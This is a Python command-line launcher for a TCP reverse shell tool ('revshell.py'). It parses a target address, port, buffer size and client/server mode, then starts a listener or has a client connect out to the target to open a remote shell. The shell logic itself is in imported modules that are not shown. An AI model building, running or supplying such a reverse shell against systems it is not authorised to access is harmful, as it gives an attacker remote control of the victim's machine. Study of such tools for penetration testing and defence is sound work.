#!/usr/bin/python3
import argparse
from multi import utils
from multi.nodes.server import Server
from multi.nodes.client import Client

parser = argparse.ArgumentParser(
    prog="revshell.py",
    description="RevShell: Python3 TCP reverse shell utility"
)

parser.add_argument("target", type=str, nargs="?", help="target ip address")
parser.add_argument("-v", "--verbose", action="store_true", help="verbose output")
parser.add_argument("-m", "--mode", type=str, help="operation mode [client|server]")
parser.add_argument("-p", "--port", type=int, help="port to use as TCP socket")
parser.add_argument("-b", "--buffer", type=int, help="TCP buffer size in KB (max=64)")

args = parser.parse_args()

target: str = args.target
verbose: bool = args.verbose
mode: str = args.mode
port: int = args.port
buffer: int = args.buffer

if __name__ == "__main__":
    if (target is None) and (mode is None):
        msg = "one or both of the following arguments are required: "
        parser.error(msg + "target, -m/--mode")
        exit(1)

    if target is None:
        if (mode is None) or (mode.lower() == "client"):
            utils.throw("Value for [target] can't be null if running in client mode")
    else:
        if not utils.ipv4_parse(target):
            utils.throw("Value for [target] is not a valid IPv4 address")

    if verbose:
        if target is None:
            utils.status("target => 0.0.0.0")
        else:
            utils.status(f"target => {target}")

    if buffer is not None:
        if buffer > 64:
            utils.throw("Value for [buffer] must be in [16, 32, 64]")

        buff_size = buffer * 1024
    else:
        buff_size = 1024

    if verbose:
        utils.status(f"buffer => {buff_size}")

    if mode is not None:
        if mode.lower() not in ["client", "server"]:
            utils.throw("Expected <mode> to be 'client' or 'server'")
    else:
        mode = "client"

    if verbose:
        utils.status(f"mode => {mode.lower()}")

    if mode == "server":
        if target is not None:
            if port is not None:
                handler = Server(target, port)
            else:
                handler = Server(target)
        else:
            if port is not None:
                handler = Server(port=port)
            else:
                handler = Server()

        handler.listen()
    else:
        if port is not None:
            handler = Client(target, port)
        else:
            handler = Client(target)

        handler.connect()
